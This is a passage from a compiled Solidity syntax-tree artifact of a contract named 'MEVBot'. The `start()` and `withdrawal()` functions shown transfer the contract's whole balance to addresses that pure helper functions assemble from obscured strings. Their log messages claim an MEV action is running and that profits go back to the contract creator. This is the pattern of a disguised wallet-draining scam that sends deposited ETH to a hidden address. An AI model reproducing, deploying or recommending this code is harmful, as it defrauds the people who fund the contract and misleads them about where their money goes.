																"overloadedDeclarations": [],
																"referencedDeclaration": 1272,
																"src": "14596:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
																	"typeString": "function () pure returns (string memory)"
																}
															},
															"id": 1342,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14596:13:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1340,
														"name": "parseMempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 906,
														"src": "14583:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_address_$",
															"typeString": "function (string memory) pure returns (address)"
														}
													},
													"id": 1343,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14583:27:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"functionReturnParameters": 1339,
												"id": 1344,
												"nodeType": "Return",
												"src": "14576:34:0"
											}
										]
									},
									"documentation": null,
									"id": 1346,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_callMEVAction",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1336,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "14531:2:0"
									},
									"returnParameters": {
										"id": 1339,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1338,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1346,
												"src": "14557:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1337,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "14557:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "14556:9:0"
									},
									"scope": 1583,
									"src": "14508:109:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1366,
										"nodeType": "Block",
										"src": "14819:152:0",
										"statements": [
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2e",
															"id": 1350,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "14838:58:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_9fb03945078bc6c7000c07d459687b271ae0adc059777dee3669b3c70b385107",
																"typeString": "literal_string \"Running MEV action. This can take a while; please wait..\""
															},
															"value": "Running MEV action. This can take a while; please wait.."
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_9fb03945078bc6c7000c07d459687b271ae0adc059777dee3669b3c70b385107",
																"typeString": "literal_string \"Running MEV action. This can take a while; please wait..\""
															}
														],
														"id": 1349,
														"name": "Log",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 15,
														"src": "14834:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (string memory)"
														}
													},
													"id": 1351,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14834:63:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1352,
												"nodeType": "EmitStatement",
												"src": "14829:68:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1361,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": -28,
																		"src": "14950:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_MEVBot_$1583",
																			"typeString": "contract MEVBot"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_MEVBot_$1583",
																			"typeString": "contract MEVBot"
																		}
																	],
																	"id": 1360,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "14942:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 1359,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "14942:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1362,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "14942:13:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"id": 1363,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "balance",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "14942:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [],
																	"expression": {
																		"argumentTypes": [],
																		"id": 1355,
																		"name": "_callMEVAction",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1346,
																		"src": "14915:14:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$__$returns$_t_address_$",
																			"typeString": "function () pure returns (address)"
																		}
																	},
																	"id": 1356,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "14915:16:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1354,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "14907:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_payable_$",
																	"typeString": "type(address payable)"
																},
																"typeName": {
																	"id": 1353,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "14907:8:0",
																	"stateMutability": "payable",
																	"typeDescriptions": {
																		"typeIdentifier": null,
																		"typeString": null
																	}
																}
															},
															"id": 1357,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14907:25:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 1358,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "14907:34:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 1364,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14907:57:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1365,
												"nodeType": "ExpressionStatement",
												"src": "14907:57:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "be9a6555",
									"id": 1367,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "start",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1347,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "14801:2:0"
									},
									"returnParameters": {
										"id": 1348,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "14819:0:0"
									},
									"scope": 1583,
									"src": "14787:184:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1387,
										"nodeType": "Block",
										"src": "15119:150:0",
										"statements": [
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e",
															"id": 1371,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "15138:53:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6",
																"typeString": "literal_string \"Sending profits back to contract creator address...\""
															},
															"value": "Sending profits back to contract creator address..."
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6",
																"typeString": "literal_string \"Sending profits back to contract creator address...\""
															}
														],
														"id": 1370,
														"name": "Log",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 15,
														"src": "15134:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (string memory)"
														}
													},
													"id": 1372,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "15134:58:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1373,
												"nodeType": "EmitStatement",
												"src": "15129:63:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1382,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": -28,
																		"src": "15248:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_MEVBot_$1583",
																			"typeString": "contract MEVBot"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_MEVBot_$1583",
																			"typeString": "contract MEVBot"
																		}
																	],
																	"id": 1381,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "15240:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 1380,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "15240:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1383,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "15240:13:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"id": 1384,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "balance",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "15240:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [],
																	"expression": {
																		"argumentTypes": [],
																		"id": 1376,
																		"name": "withdrawalProfits",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1485,
																		"src": "15210:17:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$__$returns$_t_address_$",
																			"typeString": "function () pure returns (address)"
																		}
																	},
																	"id": 1377,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "15210:19:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1375,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "15202:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_payable_$",
																	"typeString": "type(address payable)"
																},
																"typeName": {
																	"id": 1374,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "15202:8:0",
																	"stateMutability": "payable",
																	"typeDescriptions": {
																		"typeIdentifier": null,
																		"typeString": null
																	}
																}
															},
															"id": 1378,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "15202:28:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 1379,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "15202:37:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 1385,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "15202:60:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1386,
												"nodeType": "ExpressionStatement",
												"src": "15202:60:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "d4e93292",
									"id": 1388,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "withdrawal",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1368,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "15101:2:0"
									},
									"returnParameters": {
										"id": 1369,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "15119:0:0"
									},
									"scope": 1583,
									"src": "15082:187:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1465,
										"nodeType": "Block",
										"src": "15509:386:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1397,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1395,
														"name": "_i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1390,
														"src": "15523:2:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1396,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "15529:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "15523:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1401,
												"nodeType": "IfStatement",
												"src": "15519:48:0",
												"trueBody": {
													"id": 1400,
													"nodeType": "Block",
													"src": "15532:35:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1398,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "string",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "15553:3:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																	"typeString": "literal_string \"0\""
																},
																"value": "0"
															},
															"functionReturnParameters": 1394,
															"id": 1399,
															"nodeType": "Return",
															"src": "15546:10:0"
														}
													]
												}
											},
											{
												"assignments": [
													1403
												],
												"declarations": [
													{
														"constant": false,
														"id": 1403,
														"mutability": "mutable",
														"name": "j",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1465,
														"src": "15576:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1402,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "15576:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1405,
												"initialValue": {
													"argumentTypes": null,
													"id": 1404,
													"name": "_i",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1390,
													"src": "15585:2:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "15576:11:0"
											},
											{
												"assignments": [
													1407
												],
												"declarations": [
													{
														"constant": false,
														"id": 1407,
														"mutability": "mutable",
														"name": "len",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1465,
														"src": "15597:8:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1406,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "15597:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1408,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "15597:8:0"
											},
											{
												"body": {
													"id": 1419,
													"nodeType": "Block",
													"src": "15630:51:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1413,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "15644:5:0",
																"subExpression": {
																	"argumentTypes": null,
																	"id": 1412,
																	"name": "len",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1407,
																	"src": "15644:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1414,
															"nodeType": "ExpressionStatement",
															"src": "15644:5:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1417,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1415,
																	"name": "j",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1403,
																	"src": "15663:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3130",
																	"id": 1416,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "15668:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_10_by_1",
																		"typeString": "int_const 10"
																	},
																	"value": "10"
																},
																"src": "15663:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1418,
															"nodeType": "ExpressionStatement",
															"src": "15663:7:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1411,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1409,
														"name": "j",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1403,
														"src": "15622:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1410,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "15627:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "15622:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1420,
												"nodeType": "WhileStatement",
												"src": "15615:66:0"
											},
											{
												"assignments": [
													1422
												],
												"declarations": [
													{
														"constant": false,
														"id": 1422,
														"mutability": "mutable",
														"name": "bstr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1465,
														"src": "15690:17:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1421,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "15690:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1427,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1425,
															"name": "len",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1407,
															"src": "15720:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1424,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "NewExpression",
														"src": "15710:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_objectcreation_pure$_t_uint256_$returns$_t_bytes_memory_ptr_$",
															"typeString": "function (uint256) pure returns (bytes memory)"
														},
														"typeName": {
															"id": 1423,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "15714:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														}
													},
													"id": 1426,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "15710:14:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "15690:34:0"
											},
											{
												"assignments": [
													1429
												],
												"declarations": [
													{
														"constant": false,
														"id": 1429,
														"mutability": "mutable",
														"name": "k",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1465,
														"src": "15734:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1428,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "15734:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1433,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1432,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1430,
														"name": "len",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1407,
														"src": "15743:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "31",
														"id": 1431,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "15749:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"src": "15743:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "15734:16:0"
											},
											{
												"body": {
													"id": 1458,
													"nodeType": "Block",
													"src": "15776:84:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1452,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 1437,
																		"name": "bstr",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1422,
																		"src": "15790:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1440,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 1439,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "UnaryOperation",
																		"operator": "--",
																		"prefix": false,
																		"src": "15795:3:0",
																		"subExpression": {
																			"argumentTypes": null,
																			"id": 1438,
																			"name": "k",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1429,
																			"src": "15795:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "15790:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					},
																					"id": 1449,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 1445,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "15813:2:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "+",
																					"rightExpression": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 1448,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 1446,
																							"name": "_i",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1390,
																							"src": "15818:2:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "%",
																						"rightExpression": {
																							"argumentTypes": null,
																							"hexValue": "3130",
																							"id": 1447,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
